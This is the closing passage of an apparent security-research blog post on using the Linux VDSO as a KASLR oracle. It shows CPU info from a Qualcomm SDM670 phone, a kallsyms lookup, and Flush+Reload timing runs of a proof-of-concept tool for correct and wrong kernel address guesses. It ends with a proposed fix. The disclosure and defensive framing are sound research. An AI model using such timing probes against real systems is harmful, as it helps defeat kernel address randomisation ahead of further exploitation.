Features    : fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp
CPU implementer : 0x51
CPU architecture: <span class="m">8</span>
CPU variant : 0x7
CPU part    : 0x803
CPU revision    : <span class="m">12</span>

processor   : <span class="m">5</span>
BogoMIPS    : <span class="m">38</span>.00
Features    : fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp
CPU implementer : 0x51
CPU architecture: <span class="m">8</span>
CPU variant : 0x7
CPU part    : 0x803
CPU revision    : <span class="m">12</span>

processor   : <span class="m">6</span>
BogoMIPS    : <span class="m">38</span>.00
Features    : fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp
CPU implementer : 0x51
CPU architecture: <span class="m">8</span>
CPU variant : 0x6
CPU part    : 0x802
CPU revision    : <span class="m">13</span>

processor   : <span class="m">7</span>
BogoMIPS    : <span class="m">38</span>.00
Features    : fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp
CPU implementer : 0x51
CPU architecture: <span class="m">8</span>
CPU variant : 0x6
CPU part    : 0x802
CPU revision    : <span class="m">13</span>

Hardware    : Qualcomm Technologies, Inc SDM670


<span class="c1"># With a correct guess</span>
$ grep vdso_start /proc/kallsyms
ffffff846c601000 R vdso_start


<span class="nb">time</span> ./experiment 0xffffff846c601000

Flush+Reload Threshold: <span class="m">217</span>
<span class="m">521</span>
<span class="m">417</span>
<span class="m">313</span>
<span class="m">156</span> *
1m37.23s real     0m03.31s user     0m27.01s system


<span class="c1"># With a wrong guess</span>

<span class="nb">time</span> ./experiment 0xffffff946c601000

Flush+Reload Threshold: <span class="m">217</span>
<span class="m">521</span>
<span class="m">417</span>
<span class="m">313</span>
<span class="m">260</span>
^c
</code></pre></div>

<h3 id="a-suggested-fix">A Suggested Fix</h3>
<p>A fix is relatively simple. Linux can randomize the VDSO  pages independently from the rest of the kernel code and data, where leaking VDSO's virtual address has no security impact.</p>
</div>
					 </div>
					</div>
				</div>

			</div>
			</div>
		</div>


		<footer class="page-footer grey darken-3">
			<div class="container">
				<div class="row">
					<div class="col l12 s12 center-align">
						<p class="grey-text lighten-1">© 2020 Longterm Security, Inc.</p>
					</div>
				</div>
			</div>
		</footer>

		<!--  Scripts-->
		<script src="./2021 - VDSO As A Potential KASLR Oracle_files/jquery.min.js.下載"></script>
		<script src="./2021 - VDSO As A Potential KASLR Oracle_files/materialize.js.下載"></script>
		<script src="./2021 - VDSO As A Potential KASLR Oracle_files/init.js.下載"></script>
		<script src="./2021 - VDSO As A Potential KASLR Oracle_files/contact.js.下載"></script>
	



</div><div class="hiddendiv common"></div><div class="drag-target" data-sidenav="nav-mobile" style="left: 0px; touch-action: pan-y; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></div></body></html>